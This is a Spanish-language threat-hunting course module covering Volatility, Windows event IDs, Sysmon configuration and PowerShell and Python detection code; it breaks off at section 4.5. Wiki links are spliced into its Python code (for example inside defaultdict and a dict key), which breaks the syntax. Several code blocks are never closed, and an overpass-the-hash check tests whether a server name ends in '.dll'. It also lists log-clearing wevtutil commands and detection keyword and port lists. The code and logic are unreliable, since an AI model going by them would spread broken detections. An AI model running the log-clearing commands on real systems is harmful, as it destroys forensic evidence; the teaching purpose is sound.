# Threat Hunting para Red Teams

> **Duracion estimada:** 6-8 semanas (24-32 sesiones)
> **Dificultad:** Avanzado

## Indice

> ⏱️ **Tiempo estimado:** 25 horas (~5 sesiones) (3745 lineas)


- [1. Introduccion al Threat Hunting](#1-introduccion-al-threat-hunting)
- [2. Memory Forensics con Volatility 3](#2-memory-forensics-con-volatility-3)
- [3. Analisis de Event Logs](#3-analisis-de-event-logs)
- [4. Sysmon Deep Dive](#4-sysmon-deep-dive)
- [5. YARA Rules](#5-yara-rules)
- [6. Sigma Rules](#6-sigma-rules)
- [7. ATT&CK-based Hunting](#7-attck-based-hunting)
- [8. Kape para Recoleccion Forense](#8-kape-para-recoleccion-forense)
- [9. Velociraptor](#9-velociraptor)
- [10. osquery](#10-osquery)
- [11. Zeek (Bro)](#11-zeek-bro)
- [12. RITA](#12-rita)
- [13. Stenographer](#13-stenographer)
- [14. Casos Practicos](#14-casos-practicos)
- [15. Ejercicios](#15-ejercicios)
- [16. Recursos](#16-recursos)

---

## 1. Introduccion al [threat hunting](../raw/thr3t-hnt.md)

### 1.1 Que es Threat Hunting?

El Threat Hunting es la busqueda proactiva de amenazas en una [red](../raw/r3d3s-f0nd4m3nt0s.md) que no han sido detectadas por herramientas automaticas (SIEM, EDR, AV). En lugar de esperar alertas, el hunter busca activamente evidencias de compromiso.

**Diferencias con otras disciplinas:**

| Aspecto | Threat Hunting | Pentesting | Blue Team |
|---------|---------------|------------|-----------|
| Objetivo | Encontrar amenazas activas | Encontrar vulnerabilidades | Defensa reactiva |
| Timeline | Presente/Pasado inmediato | Futuro | Pasado/Presente |
| Enfoque | Busqueda proactiva | Ataque simulado | Monitoreo continuo |
| Resultado | Deteccion de actividad maliciosa | Reporte de hallazgos | Alertas y bloqueo |
| Herramientas | Volatility, [yara](../raw/thr3t-hnt.md#yara), [sigma](../raw/thr3t-hnt.md#sigma), Kape | [metasploit](../raw/m3t4spl01t.md), [cobalt strike](../raw/r3d-t34m-1nfr4.md#cobalt-strike) | SIEM, EDR, FW |

### 1.2 Hipotesis de Hunting

El Threat Hunting se basa en hipotesis. Algunas hipotesis comunes para Red Teams:

1. "El atacante uso [mimikatz](../raw/p4ssw0rd-4tt4cks.md#mimikatz) para extraer credenciales de LSASS"
2. "Hay conexiones a [c2](../raw/r3v3rs3-sh3lls.md#command-and-control) en horarios no laborales"
3. "Se ejecutaron binarios no firmados en servidores criticos"
4. "El atacante esta usando living-off-the-land binaries (LOLBins)"
5. "Hay procesos inyectados en procesos legitimos (svchost.exe, explorer.exe)"
6. "Se modificaron claves de registro para [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia)"
7. "Hay tareas programadas creadas por usuarios no administradores"
8. "Se utilizaron herramientas de administracion remota (RAT) no autorizadas"

### 1.3 Ciclo de Hunting

`
1. Hipotesis → 2. Recopilar Datos → 3. Analizar → 4. Investigar → 5. [responder](../raw/w1nd0ws-p0st3xpl01t.md#responder)
     ↑                                                  |
     └──────────────────────────────────────────────────┘
`

**Herramientas por fase:**
1. Hipotesis: [mitre att&ck](../raw/s3c-f0nd4m3nt0s.md#mitre-attck), Threat Intel, Diamond Model
2. Recopilar: Kape, Velociraptor, osquery, Zeek, Stenographer
3. Analizar: Volatility, YARA, Sigma, RITA, Jupyter
4. Investigar: [event logs](../raw/w1n-f0r3ns1cs.md#event-logs), [sysmon](../raw/3dr-3v4s10n.md#sysmon), Timeline Explorer
5. Responder: Playbooks, SOAR, EDR acciones

## 2. Memory Forensics con Volatility 3

### 2.1 Instalacion

```bash
git clone https://github.com/volatilityfoundation/volatility3.git
cd volatility3
python -m pip install -r requirements.txt

# Verificar
python vol.py -h
```

### 2.2 Identificacion de Imagen

```bash
python vol.py -f memory.dmp windows.info
python vol.py -f memory.lime linux.info
python vol.py -f memory.mem mac.info
```

### 2.3 Process Listing

```bash
python vol.py -f memory.dmp windows.pslist
python vol.py -f memory.dmp windows.pstree
python vol.py -f memory.dmp windows.psscan
```

### 2.4 Analisis de Procesos

```python
import subprocess, json

def find_hidden_processes(memory_dump):
    """Encontrar procesos ocultos (psscan - pslist)"""
    def get_pids(plugin):
        r = subprocess.run(["python", "vol.py", "-f", memory_dump, plugin, "--output", "json"],
                          capture_output=True, text=True)
        return {p['PID'] for p in json.loads(r.stdout)}

    pslist_pids = get_pids("windows.pslist")
    psscan_pids = get_pids("windows.psscan")
    hidden = psscan_pids - pslist_pids

    if hidden:
        print(f"[!] Procesos ocultos: {hidden}")
    return hidden
```

### 2.5 DLL Listing

```bash
python vol.py -f memory.dmp windows.dlllist --pid 1234
python vol.py -f memory.dmp windows.dlllist
```

### 2.6 Handles

```bash
python vol.py -f memory.dmp windows.handles --pid 1234
python vol.py -f memory.dmp windows.handles --pid 1234 --object-type Process
python vol.py -f memory.dmp windows.handles --pid 1234 --object-type Mutant
```

### 2.7 Network Connections

```bash
python vol.py -f memory.dmp windows.netscan
python vol.py -f memory.dmp windows.netstat
```

### 2.8 CmdLine

```bash
python vol.py -f memory.dmp windows.cmdline
python vol.py -f memory.dmp windows.cmdline | grep -i "powershell -enc"
```

### 2.9 Malfind

```bash
python vol.py -f memory.dmp windows.malfind
python vol.py -f memory.dmp windows.malfind --pid 1234
```

### 2.10 Yarascan

```bash
python vol.py -f memory.dmp windows.yarascan --yara-rules malware.yara
python vol.py -f memory.dmp windows.yarascan --pid 1234 --yara-rules malware.yara
```

### 2.11 Timeliner

```bash
python vol.py -f memory.dmp windows.timeliner --output csv > timeline.csv
python vol.py -f memory.dmp windows.timeliner --type Process
```

### 2.12 Otros Plugins

```bash
python vol.py -f memory.dmp windows.svcscan
python vol.py -f memory.dmp windows.modules
python vol.py -f memory.dmp windows.driverscan
python vol.py -f memory.dmp windows.filescan
python vol.py -f memory.dmp windows.registry.hivelist
python vol.py -f memory.dmp windows.registry.printkey --key "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
python vol.py -f memory.dmp windows.userassist
python vol.py -f memory.dmp windows.shimcache
python vol.py -f memory.dmp windows.amcache
python vol.py -f memory.dmp windows.prefetch
python vol.py -f memory.dmp windows.callbacks
python vol.py -f memory.dmp windows.ssdt
python vol.py -f memory.dmp windows.mbrscan
```

## 3. Analisis de [event logs](../raw/w1n-f0r3ns1cs.md#event-logs)

### 3.1 Windows Event Logs

Los Event Logs de Windows son la fuente principal de informacion [forense](../raw/w1n-f0r3ns1cs.md#forense). Se almacenan en formato [evtx](../raw/w1n-f0r3ns1cs.md#event-logs) en:

```
C:\\Windows\\System32\\winevt\\Logs\\
```

**Logs principales:**
- `Security.evtx` - Eventos de seguridad (logons, logoffs, privilegios)
- `System.evtx` - Eventos del sistema (servicios, drivers, errores)
- `Application.evtx` - Eventos de aplicaciones
- `PowerShell.evtx` - Logs de [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) (script block logging)
- `Microsoft-Windows-Sysmon/Operational.evtx` - Logs de [sysmon](../raw/3dr-3v4s10n.md#sysmon)
- `Microsoft-Windows-TaskScheduler/Operational.evtx` - Tareas programadas

### 3.2 Event [ids](../raw/s3c-f0nd4m3nt0s.md#ids-ips)) Criticos de Seguridad

| Event ID | Descripcion | Categoria |
|----------|-------------|-----------|
| 4624 | Logon exitoso | [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion) |
| 4625 | Logon fallido | Autenticacion |
| 4634 | Logoff | Autenticacion |
| 4647 | Logoff iniciado por usuario | Autenticacion |
| 4648 | Logon con credenciales explicitas | Autenticacion |
| 4672 | Asignacion de privilegios especiales (Admin) | Privilegios |
| 4688 | Creacion de [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) | Procesos |
| 4689 | Terminacion de proceso | Procesos |
| 4698 | Creacion de tarea programada | [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia) |
| 4699 | Eliminacion de tarea programada | Persistencia |
| 4700 | Habilitacion de tarea programada | Persistencia |
| 4701 | Deshabilitacion de tarea programada | Persistencia |
| 4702 | Actualizacion de tarea programada | Persistencia |
| 4719 | Cambio de politica de auditoria | Politicas |
| 4720 | Creacion de usuario | Cuentas |
| 4722 | Habilitacion de usuario | Cuentas |
| 4723 | Cambio de password (propio) | Cuentas |
| 4724 | Reset de password | Cuentas |
| 4726 | Eliminacion de usuario | Cuentas |
| 4732 | Usuario agregado a grupo local | Grupos |
| 4733 | Usuario eliminado de grupo local | Grupos |
| 4740 | Cuenta bloqueada | Cuentas |
| 4768 | Solicitud de TGT (Kerberos) | Kerberos |
| 4769 | Solicitud de ST (Kerberos Service Ticket) | Kerberos |
| 4770 | Renovacion de TGT | Kerberos |
| 4771 | Falla de autenticacion Kerberos | Kerberos |
| 4776 | Validacion de credenciales (NTLM) | NTLM |
| 4778 | Conexion a session de escritorio remoto | RDP |
| 4779 | Desconexion de session RDP | RDP |
| 4781 | Cambio de nombre de usuario | Cuentas |
| 4793 | Llamada a API Password Change | Kerberos |
| 4798 | Enumeracion de grupo local | Enumeracion |
| 4799 | Enumeracion de pertenencia a grupo | Enumeracion |
| 4800 | Bloqueo de estacion de trabajo | Sesion |
| 4801 | Desbloqueo de estacion de trabajo | Sesion |
| 4816 | [rpc](../raw/w1n-s9bsyst3ms.md#rpc) detecto conflicto | [rpc](../raw/w1n-s9bsyst3ms.md#rpc) |
| 4825 | Usuario denegado acceso RDP | RDP |
| 4897 | Cambio en configuracion de separacion de roles | Config |
| 4902 | Cambio en politica de auditoria por usuario | Politicas |
| 4907 | Cambio en configuracion de auditoria de objeto | Config |
| 4928 | Establecimiento de vinculo de confianza | Confianza |
| 4929 | Eliminacion de vinculo de confianza | Confianza |
| 4930 | Modificacion de vinculo de confianza | Confianza |
| 4931 | Cambio en propiedades de confianza | Confianza |
| 4944 | Inicio de [firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls) de Windows | [firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls) |
| 4946 | Regla de firewall agregada | Firewall |
| 4947 | Regla de firewall modificada | Firewall |
| 4950 | Configuracion de firewall cambiada | Firewall |
| 4951 | Regla de firewall ignorada | Firewall |
| 4953 | Regla de firewall ignorada por grupo | Firewall |
| 5058 | Operacion de archivo de clave | [criptografia](../raw/crypt0-f0r-h4ck3rs.md) |
| 5059 | Operacion de migracion de clave | Criptografia |
| 5061 | Operacion criptografica | Criptografia |
| 5136 | Modificacion de objeto LDAP | [ad](../raw/w1nd0ws-d0m41n-4dm1n.md) |
| 5137 | Creacion de objeto LDAP | AD |
| 5140 | Acceso a recurso compartido | Acceso |
| 5145 | Acceso a recurso compartido detallado | Acceso |
| 5152 | Paquete de filtrado de Windows bloqueado | Firewall |
| 5154 | Programa escuchando en [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) | [red](../raw/r3d3s-f0nd4m3nt0s.md) |
| 5156 | Conexion de firewall permitida | Red |
| 5157 | Conexion de firewall bloqueada | Red |
| 5158 | Programa escuchando en puerto (bind) | Red |
| 5379 | Lectura de credenciales de administrador | Credenciales |
| 5382 | Vault de credenciales | Credenciales |

### 3.3 wevtutil

```bash
# Listar logs disponibles
wevtutil el

# Exportar log a EVTX
wevtutil epl Security C:\\logs\\security_backup.evtx

# Query de eventos por ID
wevtutil qe Security "/q:Event[System[EventID=4624]]" /c:10 /f:text

# Query por fecha y EventID
wevtutil qe Security "/q:Event[System[TimeCreated[timediff(@SystemTime)<=86400000]] and System[EventID=4688]]" /f:text

# Query por XML
wevtutil qe Security "/q:*[System[(EventID=4624 or EventID=4625)]]" /f:xml /c:100

# Limpiar log (requiere admin)
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Cambiar tamaño maximo de log
wevtutil sl Security /ms:1073741824  # 1GB

# Ver configuracion de un log
wevtutil gl Security
```

### 3.4 Log Parser (Microsoft)

```bash
# Instalar Log Parser 2.2 de Microsoft
# https://www.microsoft.com/en-us/download/details.aspx?id=24659

# Log Parser Studio (GUI)
# https://github.com/sans-jason/LPS

# Consultas basicas
logparser "SELECT TimeGenerated, EventID, Message FROM Security WHERE EventID=4624" -i:EVT

# Logons con usuario y IP
logparser "SELECT TimeGenerated, EXTRACT_TOKEN(Message, 0, '\\n') as User, EXTRACT_TOKEN(Message, 3, '\\n') as IP FROM Security WHERE EventID=4624" -i:EVT

# Top 10 usuarios con mas logons
logparser "SELECT EXTRACT_TOKEN(Message, 0, '\\n') as User, COUNT(*) as Count FROM Security WHERE EventID=4624 GROUP BY User ORDER BY Count DESC" -i:EVT

# Logons fuera de horario laboral
logparser "SELECT TimeGenerated, EXTRACT_TOKEN(Message, 0, '\\n') as User FROM Security WHERE EventID=4624 AND DATEPART(hour, TimeGenerated) BETWEEN 0 AND 6" -i:EVT

# Procesos creados
logparser "SELECT TimeGenerated, EXTRACT_TOKEN(Message, 5, '\\n') as Process FROM Security WHERE EventID=4688" -i:EVT

# Logons con tipo de logon
logparser "SELECT TimeGenerated, EXTRACT_TOKEN(Message, 0, '\\n') as User, EXTRACT_TOKEN(Message, 2, '\\n') as LogonType FROM Security WHERE EventID=4624" -i:EVT

# Exportar a CSV
logparser "SELECT * FROM Security WHERE EventID=4624" -i:EVT -o:CSV > logons.csv

# Multiples archivos EVTX
logparser "SELECT * FROM *.evtx WHERE EventID=4624" -i:EVT
```

### 3.5 Event Log Explorer

```powershell
# Ver eventos con PowerShell
Get-WinEvent -LogName Security -MaxEvents 10

# Filtrar por EventID
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -MaxEvents 100

# Ultimos 10 logons
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -MaxEvents 10 | Format-Table TimeCreated, Id, LevelDisplayName -Wrap

# Procesos creados
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4688} -MaxEvents 50 | Select-Object TimeCreated, @{n='Process';e={$_.Properties[5].Value}}

# Busqueda por XPath
$xml = @"
<QueryList>
  <Query Id="0">
    <Select Path="Security">
      *[System[(EventID=4624 or EventID=4625) and TimeCreated[timediff(@SystemTime) <= 86400000]]]
    </Select>
  </Query>
</QueryList>
"@

Get-WinEvent -FilterXml $xml -MaxEvents 100

# Buscar logons a una hora especifica
$events = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624,4625}
$night_logons = $events | Where-Object { $_.TimeCreated.Hour -ge 0 -and $_.TimeCreated.Hour -le 6 }

# Analizar logons por usuario
$logons = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -MaxEvents 1000
$logons | Group-Object { $_.Properties[5].Value } | Sort-Object Count -Descending

# Logons desde IPs externas
$events = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -MaxEvents 5000
$remote_logons = $events | Where-Object {
    $ip = $_.Properties[18].Value
    $ip -and $ip -notmatch '^-' -and $ip -ne '127.0.0.1' -and $ip -notmatch '^192\.168\.'
}

# Buscar procesos no firmados
$process_creation = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4688} -MaxEvents 5000
$suspicious = $process_creation | Where-Object {
    $cmd = $_.Properties[10].Value
    $cmd -and ($cmd -match 'temp' -or $cmd -match 'appdata' -or $cmd -match 'download')
}

### 3.6 Eventos 4624/4625 - Logon Analysis

```python
import struct, socket
from datetime import datetime, timedelta

class LogonAnalyzer:
    def __init__(self, evtx_path):
        self.path = evtx_path
        self.logons = []
        self.failures = []

    def parse_4624(self, event):
        """Parsear evento 4624 - Logon exitoso"""
        props = event.Properties
        return {
            'time': event.TimeCreated,
            'user': props[5].Value,      # Target User
            'domain': props[6].Value,     # Target Domain
            'logon_type': props[8].Value, # Logon Type
            'process': props[11].Value,   # Process
            '[ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip)': props[18].Value,        # [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) Address
            'workstation': props[11].Value
        }

    def analyze_logon_patterns(self):
        """Analizar patrones de logon"""
        patterns = []
        for logon in self.logons:
            # Logon tipo 3 (Network) desde IP no corporativa
            if logon['logon_type'] == 3 and logon['ip']:
                if not self.is_corporate_ip(logon['ip']):
                    patterns.append(('Suspicious network logon', logon))

            # Logon tipo 10 (RemoteInteractive) fuera de horario
            if logon['logon_type'] == 10:
                hour = logon['time'].hour
                if hour < 7 or hour > 19:
                    patterns.append(('Off-hours RDP logon', logon))

            # Logon tipo 4 (Batch) - servicio o tarea programada
            if logon['logon_type'] == 4:
                patterns.append(('Batch logon', logon))

            # Logon tipo 5 (Service) - servicio
            if logon['logon_type'] == 5:
                patterns.append(('Service logon', logon))

        return patterns

    def detect_pass_the_hash(self):
        """Detectar posibles ataques pass-the-[hash](../raw/w1nd0ws-p0st3xpl01t.md#pass-the-hash)"""
        # PTH tipicamente usa logon tipo 3 (Network) con
        # multiples logons desde diferentes IPs en poco tiempo
        from collections import defaultdict
        user_ips = defaultdict([set](../raw/ph1sh1ng.md#social-engineering-toolkit))

        for logon in self.logons:
            if logon['logon_type'] == 3:
                user_ips[logon['user']].add(logon['ip'])

        suspicious = {u: [ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips) for u, [ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips) in user_ips.items() if len([ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips)) > 5}
        return suspicious

    def detect_brute_force(self, threshold=10, window_minutes=5):
        """Detectar [fuerza bruta](../raw/p4ssw0rd-4tt4cks.md#fuerza-bruta) por EventID 4625"""
        from collections import defaultdict, deque

        window = timedelta(minutes=window_minutes)
        attempts = defaultdict(deque)

        for failure in sorted(self.failures, key=lambda x: x['time']):
            user = failure['user']
            while attempts[user] and (failure['time'] - attempts[user][0]) > window:
                attempts[user].popleft()
            attempts[user].append(failure)

            if len(attempts[user]) >= threshold:
                return True, user, len(attempts[user])
        return False, None, 0

    def is_corporate_ip(self, ip):
        """Verificar si IP es corporativa"""
        try:
            ip_int = struct.unpack("!I", socket.inet_aton(ip))[0]
            internal = [
                (0x0A000000, 0xFF000000),     # 10.0.0.0/8
                (0xAC100000, 0xFFF00000),     # 172.16.0.0/12
                (0xC0A80000, 0xFFFF0000),     # 192.168.0.0/16
            ]
            for net, mask in internal:
                if (ip_int & mask) == net:
                    return True
        except: pass
        return False

    def generate_report(self):
        """Generar reporte de logons"""
        report = []
        report.append("=== REPORTE DE LOGONS ===")
        report.append(f"Total logons: {len(self.logons)}")
        report.append(f"Total fallos: {len(self.failures)}")
        report.append("")

        # Por tipo de logon
        from collections import Counter
        types = Counter(l['logon_type'] for l in self.logons)
        logon_types = {2:'Interactive', 3:'Network', 4:'Batch', 5:'Service',
                       7:'Unlock', 8:'NetworkCleartext', 9:'NewCredentials',
                       10:'RemoteInteractive'}
        report.append("Logons por tipo:")
        for t, count in types.most_common():
            name = logon_types.get(t, f"Type{t}")
            report.append(f"  {name}: {count}")

        # Por usuario
        users = Counter(l['user'] for l in self.logons)
        report.append("\nLogons por usuario (top 10):")
        for user, count in users.most_common(10):
            report.append(f"  {user}: {count}")

        return "\n".join(report)
```

### 3.7 Evento 4688 - Process Creation

```python
class ProcessCreationAnalyzer:
    def __init__(self):
        self.processes = []

    def parse_4688(self, event):
        """Parsear evento 4688 - Creacion de proceso"""
        props = event.Properties
        return {
            'time': event.TimeCreated,
            'user': props[1].Value,         # Subject User
            'pid': props[4].Value,           # New Process ID
            'name': props[5].Value,          # New Process Name
            'cmdline': props[10].Value,      # Command Line
            'parent_pid': props[13].Value,   # Parent Process ID
            'parent_name': props[14].Value,  # Parent Process Name
        }

    def find_suspicious_processes(self):
        """Encontrar procesos sospechosos"""
        suspicious = []

        for p in self.processes:
            # 1. LOLBins
            lolbins = ['rundll32.exe', 'regsvr32.exe', 'mshta.exe',
                      'cscript.exe', 'wscript.exe', 'msiexec.exe',
                      'certutil.exe', 'wmic.exe', 'powershell.exe',
                      'cmd.exe', 'schtasks.exe', 'reg.exe']

            if p['name'].lower() in lolbins:
                suspicious.append(('LOLBin', p))

            # 2. Procesos hijos anormales
            abnormal_children = {
                'winword.exe': ['cmd.exe', 'powershell.exe'],
                'excel.exe': ['cmd.exe', 'powershell.exe'],
                'outlook.exe': ['cmd.exe', 'powershell.exe'],
                'chrome.exe': ['cmd.exe', 'powershell.exe'],
                'firefox.exe': ['cmd.exe', 'powershell.exe'],
            }
            parent = p['parent_name'].lower()
            if parent in abnormal_children:
                if p['name'].lower() in abnormal_children[parent]:
                    suspicious.append(('Office->Shell', p))

            # 3. Procesos desde directorios temporales
            if p['name'] and ('temp' in p['name'].lower() or
                              'appdata' in p['name'].lower() or
                              'downloads' in p['name'].lower()):
                suspicious.append(('From Temp', p))

            # 4. Command lines con IOCs
            if p['cmdline']:
                cmd = p['cmdline'].lower()
                iocs = ['-enc', 'bypass', 'hidden', 'downloadstring',
                       'frombase64string', 'invoke-webrequest']
                for ioc in iocs:
                    if ioc in cmd:
                        suspicious.append(('Cmdline IOC', p))
                        break

        return suspicious
```

### 3.8 Evento 4648 - Explicit Credentials

```python
class ExplicitCredentialsAnalyzer:
    """Analiza uso de credenciales explicitas (RunAs, RDP)"""

    def parse_4648(self, event):
        props = event.Properties
        return {
            'time': event.TimeCreated,
            'user': props[1].Value,
            'target_user': props[5].Value,
            'target_domain': props[6].Value,
            'target_server': props[7].Value,
            'process': props[9].Value,
            'ip': props[13].Value,
        }

    def detect_overpass_the_hash(self, events):
        """Detectar Overpass-the-[hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions)"""
        # OTPH muestra 4648 con target_server IP y luego 4624
        overpass = []
        for e in events:
            if e['target_server'].endswith('.dll'):
                overpass.append(e)
        return overpass

    def detect_pass_the_hash(self, events, network_logons):
        """Detectar [pth](../raw/w1nd0ws-p0st3xpl01t.md#pass-the-hash) usando 4648 y 4624 correlacion"""
        # Buscar 4648 seguido de 4624 tipo 3 desde misma IP
        pth_candidates = []
        for e in events:
            matching_logons = [l for l in network_logons
                             if l['user'] == e['target_user']
                             and l['domain'] == e['target_domain']
                             and abs((l['time'] - e['time']).total_seconds()) < 5]
            if matching_logons:
                pth_candidates.append((e, matching_logons))
        return pth_candidates

### 3.9 Sysmon Event IDs (Previa al Deep Dive)

Sysmon extiende los logs de Windows con eventos detallados:

| Event ID | Nombre | Descripcion |
|----------|--------|-------------|
| 1 | ProcessCreate | Creacion de proceso |
| 2 | FileChangeTime | Cambio de timestamp de archivo |
| 3 | NetworkConnect | Conexion de red |
| 4 | SysmonServiceStateChange | Cambio de estado de Sysmon |
| 5 | ProcessTerminated | Terminacion de proceso |
| 6 | DriverLoad | Carga de [driver](../raw/k3rn3l-h4ck1ng.md#windows-drivers) |
| 7 | ImageLoad | Carga de imagen (DLL) |
| 8 | CreateRemoteThread | Creacion de [hilo](../raw/0s-f0nd4m3nt0s.md#hilos) remoto |
| 9 | RawAccessRead | Lectura de acceso raw |
| 10 | ProcessAccess | Acceso a proceso |
| 11 | FileCreate | Creacion de archivo |
| 12 | RegistryEvent (Object Create/Delete) | Creacion/eliminacion de registro |
| 13 | RegistryEvent (Value Set) | Modificacion de valor de registro |
| 14 | RegistryEvent (Key/Rename) | Renombrado de clave de registro |
| 15 | FileCreateStreamHash | Creacion de stream de archivo (NTFS ADS) |
| 16 | ServiceConfigurationChange | Cambio de configuracion de servicio |
| 17 | PipeEvent (Pipe Created) | Creacion de pipe |
| 18 | PipeEvent (Pipe Connected) | Conexion a pipe |
| 19 | WmiEventFilter | Creacion de filtro [wmi](../raw/w1n-s9bsyst3ms.md#wmi) |
| 20 | WmiEventConsumer | Creacion de consumidor WMI |
| 21 | WmiEventBinding | Vinculacion WMI |
| 22 | DNSEvent | Consulta [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) |
| 23 | FileDelete | Eliminacion de archivo |
| 24 | ClipboardChange | Cambio en portapapeles |
| 25 | ProcessTampering | Manipulacion de proceso |
| 26 | FileDeleteDetected | Eliminacion detectada de archivo |
| 27 | FileBlockExecutable | Bloqueo de ejecutable |

## 4. [sysmon](../raw/3dr-3v4s10n.md#sysmon) Deep Dive

### 4.1 Instalacion y Configuracion

```bash
# Descargar Sysmon de Microsoft Sysinternals
# https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon

# Instalar con configuracion por defecto
Sysmon64.exe -accepteula -i

# Instalar con archivo de configuracion personalizado
Sysmon64.exe -accepteula -i sysmon-config.xml

# Actualizar configuracion
Sysmon64.exe -c sysmon-config.xml

# Desinstalar
Sysmon64.exe -u

# Ver estado
Sysmon64.exe -s
```

### 4.2 Configuracion de Sysmon

Archivo de configuracion tipico:

```xml
<Sysmon schemaversion="4.82">
  <!-- HashAlgorithm: SHA1, MD5, SHA256 -->
  <HashAlgorithms>SHA256</HashAlgorithms>

  <EventFiltering>
    <!-- Event 1: Process Creation -->
    <ProcessCreate onmatch="exclude">
      <!-- Excluir procesos de sistema normales -->
      <CommandLine condition="is">C:\\Windows\\system32\\svchost.exe -k</CommandLine>
      <Image condition="end with">\\Windows\\System32\\conhost.exe</Image>
    </ProcessCreate>

    <!-- Event 3: Network Connection -->
    <NetworkConnect onmatch="exclude">
      <Image condition="end with">\\Windows\\System32\\svchost.exe</Image>
      <DestinationIp condition="is">127.0.0.1</DestinationIp>
    </NetworkConnect>

    <!-- Event 7: Image Load (DLL) - SOLO procesos sospechosos -->
    <ImageLoad onmatch="include">
      <Image condition="image">
        C:\\Users\\*\\Desktop\\*
        C:\\Users\\*\\Downloads\\*
        C:\\Users\\*\\AppData\\*
        C:\\Windows\\Temp\\*
        C:\\Temp\\*
      </Image>
    </ImageLoad>

    <!-- Event 8: CreateRemoteThread -->
    <CreateRemoteThread onmatch="include">
      <StartModule condition="image">
        C:\\Windows\\System32\\
      </StartModule>
      <!-- Incluir siempre -->
    </CreateRemoteThread>

    <!-- Event 9: RawAccessRead (Mimikatz) -->
    <RawAccessRead onmatch="include">
      <Image condition="image">
        C:\\Users\\*\\Desktop\\*
        C:\\Users\\*\\Downloads\\*
        C:\\Users\\*\\AppData\\*
      </Image>
    </RawAccessRead>

    <!-- Event 10: ProcessAccess -->
    <ProcessAccess onmatch="include">
      <SourceImage condition="image">
        C:\\Users\\*\\*
        C:\\ProgramData\\*
      </SourceImage>
    </ProcessAccess>

    <!-- Event 11-14: Registry Events -->
    <RegistryEvent onmatch="include">
      <TargetObject condition="begin with">HKLM\\System\\CurrentControlSet\\Services\\</TargetObject>
      <TargetObject condition="contains">\\Microsoft\\Windows\\CurrentVersion\\Run</TargetObject>
      <TargetObject condition="contains">\\Microsoft\\Windows\\CurrentVersion\\RunOnce</TargetObject>
      <TargetObject condition="contains">\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options</TargetObject>
      <TargetObject condition="contains">\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</TargetObject>
    </RegistryEvent>

    <!-- Event 15: FileCreateStreamHash (NTFS ADS) -->
    <FileCreateStreamHash onmatch="include">
      <TargetFilename condition="contains">:Zone.Identifier</TargetFilename>
      <TargetFilename condition="contains">:$DATA</TargetFilename>
    </FileCreateStreamHash>

    <!-- Event 17-18: Pipe Events -->
    <PipeEvent onmatch="include">
      <PipeName condition="contains">\\pipe\\</PipeName>
    </PipeEvent>

    <!-- Event 22: DNS Query -->
    <DnsQuery onmatch="exclude">
      <!-- Excluir queries normales -->
      <QueryName condition="end with">.microsoft.com</QueryName>
      <QueryName condition="end with">.windowsupdate.com</QueryName>
      <QueryName condition="end with">.office.com</QueryName>
    </DnsQuery>

    <!-- Event 25: Process Tampering -->
    <ProcessTampering onmatch="include">
      <!-- Siempre incluir -->
    </ProcessTampering>

  </EventFiltering>
</Sysmon>
```

### 4.3 Sysmon Event 1 - Process Creation

```powershell
# Buscar procesos creados por cmd/powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1} |
  Where-Object { $_.Properties[4].Value -match 'cmd\.exe|powershell\.exe' } |
  Select-Object TimeCreated, @{n='Parent';e={$_.Properties[11].Value}},
    @{n='Child';e={$_.Properties[4].Value}},
    @{n='Command';e={$_.Properties[9].Value}}

# Buscar procesos con lineas de comando sospechosas
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1} -MaxEvents 1000 |
  Where-Object { $_.Properties[9].Value -match '-enc|bypass|hidden|download' } |
  Format-Table TimeCreated, @{n='Image';e={$_.Properties[4].Value}},
    @{n='CmdLine';e={$_.Properties[9].Value}}
```

### 4.4 Sysmon Event 3 - Network Connect

```powershell
# Conexiones a IPs externas
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=3} |
  Where-Object { $_.Properties[4].Value -notmatch '^192\.168\.|^10\.|^172\.(1[6-9]|2[0-9]|3[0-1])' } |
  Select-Object TimeCreated, @{n='Image';e={$_.Properties[1].Value}},
    @{n='IP';e={$_.Properties[4].Value}},
    @{n='Port';e={$_.Properties[5].Value}},
    @{n='State';e={$_.Properties[7].Value}}

# Conexiones a puertos sospechosos
$suspicious_ports = @(4444, 1337, 5555, 6666, 7777, 8888, 9001, 31337, 53)
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=3} |
  Where-Object { [int]$_.Properties[5].Value -in $suspicious_ports } |
  Select-Object TimeCreated, @{n='Image';e={$_.Properties[1].Value}},
    @{n='IP';e={$_.Properties[4].Value}},
    @{n='Port';e={$_.Properties[5].Value}}

# Conexiones salientes HTTP anormales
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=3} |
  Where-Object { [int]$_.Properties[5].Value -eq 80 -or [int]$_.Properties[5].Value -eq 443 } |
  Group-Object { $_.Properties[1].Value } | Sort-Object Count -Descending |
  Select-Object Count, Name
```

### 4.5 Sysmon Event 7 - Image Load (DLL)

```powershell
